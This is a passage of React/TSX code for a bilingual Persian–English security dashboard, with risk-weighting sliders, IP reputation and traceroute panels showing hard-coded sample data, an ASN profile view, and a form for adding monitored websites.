            {riskSuccessMsg}
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Sliders layout column 8 */}
          <div className="lg:col-span-8 space-y-4">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-6">
              <h3 className="text-sm font-semibold text-slate-200 uppercase tracking-wider pb-3 border-b border-dash-border/40">
                {isRtl ? "پارامترهای ارزیابی هوشمند" : "Security Weighting parameters"}
              </h3>

              {/* Slider 1 */}
              <div className="space-y-2">
                <div className="flex justify-between text-xs">
                  <span className="text-slate-300 font-bold">{isRtl ? "ضریب اثرانگشت دیجیتال مرورگر" : "Browser Fingerprint Weight"}</span>
                  <span className="text-indigo-400 font-mono font-bold">{browserFingerprintCoeff}%</span>
                </div>
                <input
                  type="range"
                  min="10"
                  max="100"
                  value={browserFingerprintCoeff}
                  onChange={(e) => setBrowserFingerprintCoeff(Number(e.target.value))}
                  className="w-full accent-indigo-505 bg-slate-800"
                />
                <p className="text-[10px] text-slate-500">
                  {isRtl ? "وزن بررسی مشخصات کوکی، اندازه صفحه و هدرهای مرورگر برای اعتبارسنجی" : "Weights browser headers, cookie tokens, canvas rendering anomalies."}
                </p>
              </div>

              {/* Slider 2 */}
              <div className="space-y-2">
                <div className="flex justify-between text-xs">
                  <span className="text-slate-300 font-bold">{isRtl ? "ضریب اعتبار و تاریخچه رنج IP" : "IP Reputation weight"}</span>
                  <span className="text-indigo-400 font-mono font-bold">{ipReputationCoeff}%</span>
                </div>
                <input
                  type="range"
                  min="10"
                  max="100"
                  value={ipReputationCoeff}
                  onChange={(e) => setIpReputationCoeff(Number(e.target.value))}
                  className="w-full accent-indigo-505 bg-slate-800"
                />
                <p className="text-[10px] text-slate-500">
                  {isRtl ? "تاثیر دیتابیس هوشمند در شناسایی پراکسی‌ها و ردیابی وی‌پی‌ان" : "Weights global ASN threat database logs, TOR exit node history stats."}
                </p>
              </div>

              {/* Slider 3 */}
              <div className="space-y-2">
                <div className="flex justify-between text-xs">
                  <span className="text-slate-300 font-bold">{isRtl ? "ضریب آنتروپی رفتاری کاربر" : "Behavioral Entropy weight"}</span>
                  <span className="text-indigo-400 font-mono font-bold">{behaviorEntropyCoeff}%</span>
                </div>
                <input
                  type="range"
                  min="10"
                  max="100"
                  value={behaviorEntropyCoeff}
                  onChange={(e) => setBehaviorEntropyCoeff(Number(e.target.value))}
                  className="w-full accent-indigo-505 bg-slate-800"
                />
                <p className="text-[10px] text-slate-500">
                  {isRtl ? "میزان حساسیت بر روی ریتم کلیک کردن، جابجایی ماوس و دکمه‌ها" : "Weights pattern deviations on keystroke rhythms and cursor patterns."}
                </p>
              </div>

              {/* Slider 4 */}
              <div className="space-y-2">
                <div className="flex justify-between text-xs">
                  <span className="text-slate-300 font-bold">{isRtl ? "ضریب فاصله‌ی جغرافیایی غیرممکن" : "Impossible Latency Check weight"}</span>
                  <span className="text-indigo-400 font-mono font-bold">{networkLatencyCoeff}%</span>
                </div>
                <input
                  type="range"
                  min="10"
                  max="100"
                  value={networkLatencyCoeff}
                  onChange={(e) => setNetworkLatencyCoeff(Number(e.target.value))}
                  className="w-full accent-indigo-505 bg-slate-800"
                />
                <p className="text-[10px] text-slate-500">
                  {isRtl ? "ارزیابی سرعت ورودهای متعدد در فواصل مکانی طولانی" : "Weights geographic velocities (e.g. login from London then 5 mins later Berlin)."}
                </p>
              </div>
            </div>
          </div>

          {/* Side stats Column 4 */}
          <div className="lg:col-span-4 space-y-4">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
              <h3 className="text-xs font-bold text-slate-400 uppercase tracking-wider">
                {isRtl ? "معادله ماتریکس ریسک فعال" : "Active Risk Vector Formula"}
              </h3>
              <div className="bg-[#04060b] border border-slate-800 rounded-lg p-3 font-mono text-[11px] text-indigo-300 overflow-x-auto text-left">
                <code>
                  SCORE = (BF*{browserFingerprintCoeff} + IP*{ipReputationCoeff} + BE*{behaviorEntropyCoeff} + LAT*{networkLatencyCoeff}) / 4
                </code>
              </div>

              <div className="h-44 w-full">
                <ResponsiveContainer width="100%" height="100%">
                  <PieChart>
                    <Pie
                      data={[
                        { name: "Browser", val: browserFingerprintCoeff, fill: "#6366F1" },
                        { name: "IP Rep", val: ipReputationCoeff, fill: "#EC4899" },
                        { name: "Behavior", val: behaviorEntropyCoeff, fill: "#10B981" },
                        { name: "Velocity", val: networkLatencyCoeff, fill: "#F59E0B" },
                      ]}
                      dataKey="val"
                      innerRadius={36}
                      outerRadius={50}
                      paddingAngle={3}
                    >
                      <Cell fill="#6366F1" />
                      <Cell fill="#F43F5E" />
                      <Cell fill="#10B981" />
                      <Cell fill="#F59E0B" />
                    </Pie>
                  </PieChart>
                </ResponsiveContainer>
              </div>

              <div className="text-center">
                <p className="text-[10px] text-slate-400 font-medium">
                  {isRtl ? "نمودار سهم عوامل در میانگین ۲۴ ساعته ماتریکس فایروال" : "Factor share of live risk assessment decisions"}
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // 3) SUBVIEW: IP INTELLIGENCE SEARCH & CHILDREN
  const isIpIntelView = [
    "ipIntelligence",
    "networkAnalysis",
    "threatIntelligence",
    "asnExplorer",
    "domainAnalysis"
  ].includes(activeTab);

  if (isIpIntelView) {
    let tabTitle = isRtl ? "کاوشگر هوش آدرس IP و تهدیدات" : "IP Intelligence & Threat Explorer";
    let tabDesc = isRtl 
      ? "آدرس هدف خود را وارد نمایید تا سابقه، تهدیدات و موقعیت مکانی آن استخراج شود" 
      : "Search global IP threat feeds, ASN vectors, VPN routing tags.";
    let searchLabel = isRtl ? "جستجوی پایگاه داده تهدیدات" : "Query Threat Database";
    let searchPlaceholder = "e.g. 185.220.101.23, 8.8.8.8";

    if (activeTab === "networkAnalysis") {
      tabTitle = isRtl ? "تحلیل شبکه و پایش پینگ" : "Network Topology & Performance Analysis";
      tabDesc = isRtl ? "پایش مسیرهای روتینگ شبکه، پهنای باند گیت‌وی و تحلیل پکت‌های امنیتی لایو" : "Monitor live network latency routing, gateway bandwidth, and analyze payload data feeds.";
      searchLabel = isRtl ? "بررسی گیت‌وی و هاپ‌های شبکه" : "Diagnostic Target Traceroute";
      searchPlaceholder = "e.g. 185.220.101.23";
    } else if (activeTab === "threatIntelligence") {
      tabTitle = isRtl ? "اطلاعات هوش تهدیدات و فیدهای مخرب" : "Threat Intelligence & Cyber Reconnaissance";
      tabDesc = isRtl ? "بررسی رده‌های ریسک، فیدهای هانی‌پات مستقل و فعالیت‌های بات‌نت شناخته‌شده" : "Cross-reference known botnet activities, malware pools, and automated spam engines.";
      searchLabel = isRtl ? "استعلام شاخص ریسک و تهدیدات" : "Query Threat Score Feeds";
      searchPlaceholder = "e.g. 185.220.101.23";
    } else if (activeTab === "asnExplorer") {
      tabTitle = isRtl ? "کاوشگر جزئیات خودمختار ASN" : "Autonomous System Number (ASN) Explorer";
      tabDesc = isRtl ? "تحلیل گروه‌های بزرگ IP، پیشوندهای BGP اعلام شده و اطلاعات دیتاسنترها" : "Lookup ASN profiles, inspect advertised IPv4/IPv6 blocks, and check routing stability indexes.";
      searchLabel = isRtl ? "جستجوی شناسه خودمختار ASN" : "Query ASN Routing Target";
      searchPlaceholder = "e.g. AS20473, AS15169";
    } else if (activeTab === "domainAnalysis") {
      tabTitle = isRtl ? "تحلیل دامنه‌ها و ساختار DNS" : "Domain Name System (DNS) & Security Analysis";
      tabDesc = isRtl ? "بررسی گواهی دامنه‌ها، رکوردهای SPF/DMARC فیلترینگ ایمیل و رکوردهای معکوس PTR" : "Validate WHOIS data, check SPF/DMARC server integrity metrics, and secure domain records.";
      searchLabel = isRtl ? "استعلام وضعیت دامنه و رکوردهای DNS" : "Query Domain Security Map";
      searchPlaceholder = "e.g. mullvad.net, google.com";
    }

    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="border-b border-dash-border/40 pb-4">
          <h2 className="text-xl font-bold text-white flex items-center gap-2">
            <Terminal className="w-5 h-5 text-indigo-400" />
            {tabTitle}
          </h2>
          <p className="text-xs text-slate-500 mt-1">
            {tabDesc}
          </p>
        </div>

        {ipSuccessMsg && (
          <div className="p-3 bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 rounded-lg text-xs font-medium flex items-center gap-2">
            <Check className="w-4 h-4" />
            {ipSuccessMsg}
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-5 space-y-4">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5">
              <h3 className="text-sm font-semibold text-slate-200 mb-4 flex items-center gap-2">
                <Search className="w-4 h-4 text-indigo-400" />
                {searchLabel}
              </h3>
              <form onSubmit={handleIpSearch} className="flex gap-2">
                <input
                  type="text"
                  value={ipInput}
                  onChange={(e) => setIpInput(e.target.value)}
                  placeholder={searchPlaceholder}
                  className={cn(
                    "flex-1 bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-slate-100 placeholder-slate-600 focus:outline-none focus:border-indigo-500"
                  )}
                />
                <button
                  type="submit"
                  className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg text-xs font-bold font-mono"
                >
                  {isRtl ? "جستجو" : "SCAN"}
                </button>
              </form>
            </div>

            {/* Quick Presets */}
            <div className="bg-dash-panel border border-dash-border rounded-xl p-4">
              <h4 className="text-[11px] font-bold text-slate-500 uppercase tracking-wider mb-2">
                {isRtl ? "اهداف پیش‌فرض هوشمند (کلیک برای کپی)" : "Live Threat Feed Presets"}
              </h4>
              <div className="space-y-2">
                {["185.220.101.23", "79.125.15.100", "8.8.8.8", "213.90.1.5"].map((ipPreset) => (
                  <button
                    key={ipPreset}
                    onClick={() => setIpInput(ipPreset)}
                    className="w-full flex items-center justify-between p-2 rounded bg-slate-800/20 border border-slate-800/40 hover:border-slate-700 font-mono text-xs text-slate-400 hover:text-slate-200"
                  >
                    <span>{ipPreset}</span>
                    <span className="text-[10px] text-slate-500 font-sans">
                      {ipPreset === "8.8.8.8" ? (isRtl ? "ایمن" : "Clean") : (isRtl ? "ریسک بالا ⚠️" : "High Risk ⚠️")}
                    </span>
                  </button>
                ))}
              </div>
            </div>
          </div>

          <div className="lg:col-span-7 font-sans">
            {/* 3a) IP Intelligence View */}
            {activeTab === "ipIntelligence" && ipResults && (
              <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
                <div className="flex justify-between items-start border-b border-dash-border/40 pb-3">
                  <div>
                    <h3 className="font-mono text-base font-bold text-white flex items-center gap-2">
                      <Globe className="w-4 h-4 text-rose-500" />
                      {ipResults.ip}
                    </h3>
                    <p className="text-xs text-slate-500 mt-1">{ipResults.isp}</p>
                  </div>
                  <div>
                    <span
                      className={cn(
                        "px-2.5 py-1 rounded text-xs font-extrabold uppercase tracking-wide border",
                        ipResults.risk > 70
                          ? "bg-rose-500/10 text-rose-400 border-rose-500/20"
                          : "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                      )}
                    >
                      SCORE: {ipResults.risk}/100
                    </span>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4 text-xs font-mono">
                  <div className="p-3 bg-slate-950/50 rounded-lg space-y-1">
                    <div className="text-slate-500">{isRtl ? "موقعیت جغرافیایی" : "GEOLOCATION"}</div>
                    <div className="text-slate-200 font-bold">{ipResults.country}</div>
                  </div>
                  <div className="p-3 bg-slate-950/50 rounded-lg space-y-1">
                    <div className="text-slate-500">{isRtl ? "دسته‌بندی تهدید" : "THREAT VECTOR"}</div>
                    <div className={cn("font-bold", ipResults.risk > 70 ? "text-rose-400" : "text-emerald-400")}>
                      {ipResults.type}
                    </div>
                  </div>
                </div>

                <div className="p-3 border border-dash-border/50 rounded-lg flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2">
                    <div className={cn("w-2 h-2 rounded-full", ipResults.status === "blocked" ? "bg-rose-500 animate-pulse" : "bg-emerald-500")} />
                    <span className="text-slate-400 font-bold">
                      {isRtl ? "سیستم امنیتی گیت‌وی:" : "Proxy Connection State:"}
                    </span>
                    <span className={cn("font-mono font-bold", ipResults.status === "blocked" ? "text-rose-500" : "text-emerald-500")}>
                      {ipResults.status === "blocked" 
                        ? (isRtl ? "مسدود شده (BLOCKED)" : "BLOCKED") 
                        : (isRtl ? "آزاد (ALLOWED)" : "ALLOWED")}
                    </span>
                  </div>
                  <button
                    onClick={handleToggleIpStatus}
                    className={cn(
                      "px-3 py-1 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded-lg border border-slate-700"
                    )}
                  >
                    {ipResults.status === "blocked" 
                      ? (isRtl ? "لغو مسدودسازی" : "WHITELIST IP") 
                      : (isRtl ? "مسدود کردن آی‌پی" : "BLOCK IP")}
                  </button>
                </div>
              </div>
            )}

            {/* 3b) Network Analysis View */}
            {activeTab === "networkAnalysis" && (
              <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
                <div className="flex justify-between items-start border-b border-dash-border/40 pb-3">
                  <div>
                    <h3 className="font-mono text-base font-bold text-white flex items-center gap-2">
                      <Activity className="w-4 h-4 text-indigo-400" />
                      {isRtl ? "گزارش مسیر و لتنسی هدف:" : "Network Routing For:"} {ipResults?.ip || "185.220.101.23"}
                    </h3>
                    <p className="text-xs text-slate-500 mt-1">{isRtl ? "رهگیری جزئیات هاپ‌های شبکه و پایداری کلاینت سایبر" : "Live gateway buffer diagnostic and packet traceroute."}</p>
                  </div>
                  <div>
                    <span className="px-2.5 py-1 bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 rounded text-xs font-mono font-bold">
                      24ms {isRtl ? "تاخیر" : "RTT"}
                    </span>
                  </div>
                </div>

                <div className="grid grid-cols-3 gap-2 text-xs font-mono">
                  <div className="p-3 bg-slate-950/40 rounded-lg">
                    <div className="text-slate-500 text-[10px] uppercase">{isRtl ? "پکت لاست" : "Packet Loss"}</div>
                    <div className="text-emerald-400 font-bold">0.0% (0/1000)</div>
                  </div>
                  <div className="p-3 bg-slate-950/40 rounded-lg">
                    <div className="text-slate-500 text-[10px] uppercase">{isRtl ? "تعداد هاپ‌ها" : "Trace Hops"}</div>
                    <div className="text-white font-bold">12 Hops</div>
                  </div>
                  <div className="p-3 bg-slate-950/40 rounded-lg">
                    <div className="text-slate-500 text-[10px] uppercase">{isRtl ? "انتقال داده" : "Transmission"}</div>
                    <div className="text-indigo-400 font-bold">TCP Multipath</div>
                  </div>
                </div>

                <div className="p-4 bg-slate-950/60 rounded-xl space-y-3 font-mono text-[11px]">
                  <h4 className="text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-2">{isRtl ? "رهگیری جزئیات هاپ‌های مسیر (Traceroute)" : "Traceroute Telemetry Hops"}</h4>
                  <div className="space-y-2">
                    {[
                      { hop: 1, ip: "192.168.1.1", rtt: "1.2ms", label: isRtl ? "روتر محلی" : "Local Gateway" },
                      { hop: 3, ip: "10.0.12.5", rtt: "4.5ms", label: isRtl ? "سوئیچ اصلی مرکز داده" : "Core DC Switch" },
                      { hop: 7, ip: "80.91.246.10", rtt: "15.8ms", label: "Telia Carrier Backbone" },
                      { hop: 12, ip: ipResults?.ip || "185.220.101.23", rtt: "24.1ms", label: ipResults?.isp || "Mullvad VPN" },
                    ].map((hop) => (
                      <div key={hop.hop} className="flex items-center justify-between border-b border-slate-900/60 pb-1.5 last:border-b-0 last:pb-0">
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-slate-600 bg-slate-900 border border-slate-800 px-1 rounded">#{hop.hop}</span>
                          <span className="text-slate-300">{hop.ip}</span>
                        </div>
                        <div className="flex items-center gap-4">
                          <span className="text-slate-500 text-[10px]">{hop.label}</span>
                          <span className="text-indigo-400 text-xs font-bold">{hop.rtt}</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* 3c) Threat Intelligence View */}
            {activeTab === "threatIntelligence" && (
              <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
                <div className="flex justify-between items-start border-b border-dash-border/40 pb-3">
                  <div>
                    <h3 className="font-mono text-base font-bold text-white flex items-center gap-2">
                      <Flame className="w-4 h-4 text-rose-500" />
                      {isRtl ? "شاخص هوش تهدیدات لایو" : "Threat Feeds & Reputations"}
                    </h3>
                    <p className="text-xs text-slate-500 mt-1">{isRtl ? "بررسی سابقه مخرب در بلک‌لیست‌ها و دیتابیس هانی‌پات" : "Cyber reputation check across primary threat indices."}</p>
                  </div>
                  <div>
                    <span className="px-2.5 py-1 bg-rose-500/10 text-rose-400 border border-rose-500/20 rounded text-xs font-bold font-mono">
                      {isRtl ? "بسیار خطرناک" : "CRITICAL"}
                    </span>
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="text-[10px] text-slate-500 uppercase font-mono tracking-wider">{isRtl ? "سیگنال‌های تهدید شناسایی شده" : "Associated Threat Indicators"}</div>
                  <div className="flex flex-wrap gap-1.5">
                    {[
                      { l: "Tor Exit Node", s: "high" },
                      { l: "Known Brute-forcer", s: "high" },
                      { l: "VPN Anonymizer", s: "med" },
                      { l: "Spam Botnet", s: "med" },
                      { l: "SSH Harvester", s: "high" },
                      { l: "Malware Hosted", s: "low" },
                    ].map((tag, i) => (
                      <span
                        key={i}
                        className={cn(
                          "px-2 py-0.5 rounded text-[10px] font-bold border font-mono",
                          tag.s === "high"
                            ? "bg-rose-500/10 text-rose-400 border-rose-500/20"
                            : tag.s === "med"
                              ? "bg-amber-500/10 text-amber-400 border-amber-500/20"
                              : "bg-slate-800 text-slate-400 border-slate-700"
                        )}
                      >
                        {tag.l}
                      </span>
                    ))}
                  </div>
                </div>

                <div className="p-4 bg-slate-950/60 rounded-xl space-y-3 font-mono text-[11px]">
                  <h4 className="text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-2">{isRtl ? "وضعیت ثبت در رادارهای امنیتی معتبر" : "Global Security Engine Diagnostics"}</h4>
                  <div className="grid grid-cols-2 gap-3">
                    {[
                      { name: "Spamhaus (DBL)", state: "BLOCKED", isSafe: false },
                      { name: "AlienVault OTX", state: "MALICIOUS", isSafe: false },
                      { name: "Cisco Talos Feed", state: "HIGH RISK", isSafe: false },
                      { name: "Google Safe Browsing", state: "CLEAN", isSafe: true },
                      { name: "AbuseIPDB Logs", state: "98% ABUSE RATIO", isSafe: false },
                      { name: "Cloudflare Blocklist", state: "SUSPICIOUS", isSafe: false },
                    ].map((engine, idx) => (
                      <div key={idx} className="flex items-center justify-between p-2 rounded bg-slate-900/60 border border-slate-800/55">
                        <span className="text-slate-400">{engine.name}</span>
                        <span className={cn(
                          "font-bold text-[10px]",
                          engine.isSafe ? "text-emerald-400" : "text-rose-400 animate-pulse"
                        )}>
                          {engine.state}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* 3d) ASN Explorer View */}
            {activeTab === "asnExplorer" && (
              <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
                <div className="flex justify-between items-start border-b border-dash-border/40 pb-3">
                  <div>
                    <h3 className="font-mono text-base font-bold text-white flex items-center gap-2">
                      <Network className="w-4 h-4 text-teal-400" />
                      AS20473 {isRtl ? "اطلاعات سیستم خودمختار" : "Autonomous System Profile"}
                    </h3>
                    <p className="text-xs text-slate-500 mt-1">{isRtl ? "پروفایل مسیریابی BGP و گستره IPهای ثبت شده" : "BGP advertisement, registry peerings, routing blocks."}</p>
                  </div>
                  <div>
                    <span className="px-2.5 py-1 bg-teal-500/10 text-teal-400 border border-teal-500/20 rounded text-xs font-extrabold font-mono">
                      AS-MULLVAD
                    </span>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4 text-xs font-mono">
                  <div className="p-3 bg-slate-950/50 rounded-lg space-y-1">
                    <div className="text-slate-500">{isRtl ? "نام کمپانی مالک" : "REGISTRANT ORG"}</div>
                    <div className="text-slate-200 font-bold">Mullvad VPN AB</div>
                  </div>
                  <div className="p-3 bg-slate-950/50 rounded-lg space-y-1">
                    <div className="text-slate-500">{isRtl ? "شناسه منطقه ریستر" : "REGISTRY PORTAL"}</div>
                    <div className="text-teal-400 font-bold">RIPE NCC (Europe)</div>
                  </div>
                </div>

                <div className="p-4 bg-slate-950/60 rounded-xl space-y-3 font-mono text-[11px]">
                  <h4 className="text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-2">{isRtl ? "اطلاعات کلیدها و حجم تخصیص آدرس‌ها" : "Routing Allocation Telemetry"}</h4>
                  <div className="space-y-2 text-slate-300">
                    <div className="flex justify-between border-b border-slate-900 pb-1.5">
                      <span>{isRtl ? "تعداد پیشوندهای ثبت‌شده IPv4:" : "Advertised IPv4 Prefixes:"}</span>
                      <span className="text-white font-bold">128 IP Blocks (/24 average)</span>
                    </div>
                    <div className="flex justify-between border-b border-slate-900 pb-1.5">
                      <span>{isRtl ? "کل آدرس‌های IPv4 معتبر:" : "Total Registered IPv4s:"}</span>
                      <span className="text-teal-400 font-bold">32,768 IPs</span>
                    </div>
                    <div className="flex justify-between border-b border-slate-900 pb-1.5">
                      <span>{isRtl ? "تعداد پیشوندهای IPv6:" : "Advertised IPv6 Prefixes:"}</span>
                      <span className="text-white font-bold">18 IP Blocks (/48 average)</span>
                    </div>
                    <div className="flex justify-between">
                      <span>{isRtl ? "شعبات گیت‌وی فرامرزی (Transit Peers):" : "Transit ISP Peerings:"}</span>
                      <span className="text-indigo-400 font-bold">Telia, Cogent, GTT Communications</span>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* 3e) Domain & Website Analysis View */}
            {activeTab === "domainAnalysis" && (() => {
              const selectedSite = monitoredWebsites.find((s: any) => s.id === selectedSiteId) || monitoredWebsites[0] || null;
              return (
                <div className="space-y-6">
                  {/* Outer Grid system */}
                  <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
                    
                    {/* Left Panel: Monitored Websites Manager (col-span-5) */}
                    <div className="xl:col-span-5 flex flex-col gap-4">
                      <div className="bg-dash-panel border border-dash-border rounded-xl p-5 flex flex-col gap-4">
                        <div className="flex justify-between items-center border border-transparent pb-3">
                          <h3 className="text-sm font-bold text-slate-200 flex items-center gap-2">
                            <Server className="w-4 h-4 text-indigo-400" />
                            {isRtl ? "پایگاه‌های نظارتی متصل" : "Connected Watch Targets"}
                          </h3>
                          <span className="text-[10px] bg-indigo-950 text-indigo-400 px-2 py-0.5 rounded font-mono font-bold">
                            {monitoredWebsites.length} {isRtl ? "سایت" : "SITES"}
                          </span>
                        </div>

                        {/* List of currently monitored domains */}
                        <div className="space-y-2.5 max-h-[320px] overflow-y-auto pr-1">
                          {monitoredWebsites.map((site: any) => {
                            const isSelected = site.id === selectedSiteId;
                            let statusColor = "bg-emerald-500";
                            let statusText = isRtl ? "امن و فعال" : "Secured";
                            if (site.status === "UNDER_ATTACK") {
                              statusColor = "bg-rose-500 animate-pulse";
                              statusText = isRtl ? "تحت حمله DDoS" : "Under attack";
                            } else if (site.status === "OFFLINE") {
                              statusColor = "bg-slate-500 animate-pulse";
                              statusText = isRtl ? "آفلاین / قطعی" : "Offline";
                            }

                            return (
                              <div
                                key={site.id}
                                onClick={() => {
                                  setSelectedSiteId(site.id);
                                  setIsAddingSite(false);
                                }}
                                className={cn(
                                  "p-3 rounded-lg border transition-all cursor-pointer flex justify-between items-center group",
                                  isSelected
                                    ? "bg-slate-800/60 border-indigo-500/50 shadow-sm"
                                    : "bg-slate-900/30 border-slate-800/60 hover:bg-slate-800/30 hover:border-slate-700/80"
                                )}
                              >
                                <div className="flex items-center gap-2.5 min-w-0">
                                  <div className="p-1 rounded bg-slate-800 border border-slate-700">
                                    <Globe className={cn("w-3.5 h-3.5", isSelected ? "text-indigo-400" : "text-slate-400")} />
                                  </div>
                                  <div className="min-w-0">
                                    <span className="font-mono text-xs font-bold text-slate-200 block truncate leading-tight">
                                      {site.domain}
                                    </span>
                                    <span className="text-[10px] text-slate-500 block font-mono mt-0.5">
                                      {site.dnsA}
                                    </span>
                                  </div>
                                </div>

                                <div className="flex items-center gap-3 shrink-0">
                                  <div className="text-right flex flex-col items-end">
                                    <div className="flex items-center gap-1.5">
                                      <div className={cn("w-2 h-2 rounded-full", statusColor)} />
                                      <span className="text-[10px] text-slate-400 font-medium">
                                        {statusText}
                                      </span>
                                    </div>
                                    {site.latency > 0 && (
                                      <span className="text-[9px] text-slate-500 font-mono">
                                        {site.latency} ms
                                      </span>
                                    )}
                                  </div>

                                  {/* Delete target button */}
                                  <button
                                    type="button"
                                    onClick={(e) => {
                                      e.stopPropagation();
                                      deleteSite(site.id, site.domain);
                                    }}
                                    disabled={site.id === "site-1"}
                                    className="p-1 rounded text-slate-500 hover:text-rose-400 hover:bg-rose-500/10 transition-colors disabled:opacity-20 disabled:cursor-not-allowed group-hover:opacity-100 opacity-50"
                                    title={isRtl ? "حذف سایت" : "Delete Watch Target"}
                                  >
                                    <Trash2 className="w-3.5 h-3.5" />
                                  </button>
                                </div>
                              </div>
                            );
                          })}
                        </div>

                        {/* Add Website trigger */}
                        {!isAddingSite && (
                          <button
                            type="button"
                            onClick={() => setIsAddingSite(true)}
                            className="w-full py-2 bg-indigo-600/10 hover:bg-indigo-600/20 border border-indigo-500/30 text-indigo-400 rounded-lg text-xs font-bold font-mono transition-all flex items-center justify-center gap-2"
                          >
                            <Plus className="w-3.5 h-3.5" />
                            {isRtl ? "اتصال دامنه و سایت جدید برای بررسی" : "ADD NEW SITE TO CONTROL"}
                          </button>
                        )}
                      </div>

                      {/* Add Website Accordion/Form Segment */}
                      {isAddingSite && (
                        <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
                          <div className="flex justify-between items-center border-b border-dash-border/40 pb-2.5">
                            <h4 className="text-xs font-bold text-slate-200">
                              {isRtl ? "مشخصات سایت و دامنه جدید" : "Identify Website Profile Target"}
                            </h4>
                            <button
                              type="button"
                              onClick={() => {
                                setIsAddingSite(false);
                                setNewSiteError("");
                              }}
                              className="text-[10px] text-slate-500 hover:text-slate-300 uppercase"
                            >
                              {isRtl ? "انصراف" : "Cancel"}
                            </button>
                          </div>

                          {newSiteError && (
                            <div className="p-2 bg-rose-500/10 border border-rose-500/20 text-rose-400 rounded text-xs font-medium">
                              ⚠️ {newSiteError}
                            </div>
                          )}

                          <form onSubmit={handleAddWebsite} className="space-y-3 text-xs">
                            <div>
                              <label className="text-slate-400 block mb-1 font-medium">
                                {isRtl ? "نام دامنه (بدون http)" : "Domain URL (no http/https)"} *
                              </label>
                              <input
                                type="text"
                                value={newSiteDomain}
                                onChange={(e) => setNewSiteDomain(e.target.value)}
                                placeholder="e.g. security-gateway.ir"
                                className="w-full bg-slate-950 border border-slate-800 rounded px-2.5 py-1.5 focus:outline-none focus:border-indigo-500 font-mono text-slate-200"
                              />
                            </div>

                            <div className="grid grid-cols-2 gap-2">
                              <div>
                                <label className="text-slate-400 block mb-1 font-medium">
                                  {isRtl ? "ثبت کننده قانونی" : "WHOIS Registrar"}
                                </label>
                                <input
                                  type="text"
                                  value={newSiteRegistrar}
                                  onChange={(e) => setNewSiteRegistrar(e.target.value)}
                                  placeholder="e.g. Gandi, Irnic"
                                  className="w-full bg-slate-950 border border-slate-800 rounded px-2.5 py-1.5 focus:outline-none focus:border-indigo-500 font-mono text-slate-200"
                                />
                              </div>
                              <div>
                                <label className="text-slate-400 block mb-1 font-medium">
                                  {isRtl ? "آدرس IP هاست" : "Initial Host IP (A)"}
                                </label>
                                <input
                                  type="text"
                                  value={newSiteA}
                                  onChange={(e) => setNewSiteA(e.target.value)}
                                  placeholder="e.g. 5.188.10.22"
                                  className="w-full bg-slate-950 border border-slate-800 rounded px-2.5 py-1.5 focus:outline-none focus:border-indigo-500 font-mono text-slate-200"
                                />
                              </div>
                            </div>

                            <div className="grid grid-cols-2 gap-2">
                              <div>
                                <label className="text-slate-400 block mb-1 font-medium">
                                  {isRtl ? "وضعیت سیگنال تهدید" : "Threat Signal State"}
                                </label>
                                <select
                                  value={newSiteStatus}
                                  onChange={(e) => setNewSiteStatus(e.target.value)}
                                  className="w-full bg-slate-950 border border-slate-800 rounded px-2.5 py-1.5 focus:outline-none focus:border-indigo-500 text-slate-300"
                                >
                                  <option value="ACTIVE & SECURED">{isRtl ? "فعال و ایمن (Secured)" : "ACTIVE & SECURED"}</option>
                                  <option value="UNDER_ATTACK">{isRtl ? "تحت حمله سایبری" : "UNDER CYBERATTACK"}</option>
                                  <option value="OFFLINE">{isRtl ? "قطعی کامل / آفلاین" : "CRITICAL OFFLINE"}</option>
                                </select>
                              </div>
                              <div>
                                <label className="text-slate-400 block mb-1 font-medium">
                                  {isRtl ? "گواهی SSL" : "SSL Cryptography"}
                                </label>
                                <input
                                  type="text"
                                  value={newSiteSsl}
                                  onChange={(e) => setNewSiteSsl(e.target.value)}
                                  placeholder="Let's Encrypt (RSA 2048)"
                                  className="w-full bg-slate-950 border border-slate-800 rounded px-2.5 py-1.5 focus:outline-none focus:border-indigo-500 font-mono text-slate-200"
                                />
                              </div>
                            </div>

                            <button
                              type="submit"
                              className="w-full py-2 bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 text-white font-bold rounded shadow-lg transition-all text-xs"
                            >
                              {isRtl ? "پیکربندی و شروع پایش پلتفرم" : "DEPLOY MONITORING MATRIX"}
                            </button>
                          </form>
                        </div>
                      )}
                    </div>

                    {/* Right Panel: Selected Website Analyzer & Rules Control Panel (col-span-7) */}
                    <div className="xl:col-span-7">
                      {selectedSite ? (
                        <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-5">
                          
                          {/* Selected target header */}
                          <div className="flex justify-between items-start border-b border-dash-border/40 pb-3.5">
                            <div>
